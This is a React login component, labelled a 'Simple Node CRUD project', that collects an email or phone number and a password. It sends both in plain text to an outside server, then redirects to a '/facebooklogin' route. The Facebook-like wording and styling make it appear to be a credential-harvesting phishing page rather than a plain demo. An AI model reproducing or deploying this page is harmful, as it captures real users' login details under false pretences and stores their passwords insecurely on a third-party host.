import { toast } from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';

import ShowWishCard from './ShowWishCard/ShowWishCard';


const Login = () => {
    // const [disable,setDisable] = useState(false)
   const navigate = useNavigate()
    const handleSubmit =(event)=>{
        event.preventDefault()
        
        // setDisable(true)

        const form = event.target
        const email = form.email.value
        const password = form.password.value

       const submition = {
        email,password
       }

       fetch('https://student-library-surver.vercel.app/data', {
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify(submition)
    })
   
        .then(res => res.json())
        .then(data => {
           if(data.acknowledged){
            form.reset()
          toast.success('Successfully Login')
          navigate('/facebooklogin')
        }
        })

        // setDisable(true)
}



 
    
    return (
        <>
        <div>
            <div className="hero min-h-screen w-10/12 m-auto ">
                <div className="hero-content flex-col lg:flex-row">
                    <div className="text-center lg:text-left">
                        <h1 className="text-5xl font-bold text-blue-700">Simple Node CRUD project</h1>
                    </div>
                    <div className="card flex-shrink-0 w-full max-w-sm shadow-2xl bg-base-100">

                     <form onSubmit={handleSubmit}>
                     <div className="card-body">
                            <div className="form-control">

                                <input name= 'email' type="text" placeholder="Email or Phone Number" className="input input-bordered"required />
                            </div>
                            <div className="form-control mt-3">

                                <input name='password' type="text" placeholder="Password" className="input input-bordered" required />
                               
                            </div>
                            <div className="form-control mt-4">

                                {/* in this button have to write disable = {disable} fot disable this button my oneClick */}

                                <button  type="submit" className=" py-2 bg-blue-600 text-xl">Submit</button> 
                                 
                            </div>
                        </div>
                     </form>
                            <div className='mb-10'>
                            <p className='text-center'>Forget account?</p>
                            <div className="divider"></div>
                            <button className= " bg-orange-500 py-2 px-2 ml-28  ">Create New Account</button>
                            </div>
                    </div>
                </div>
            </div>
        </div>
        <ShowWishCard></ShowWishCard>
        </>
    );
};

export default Login;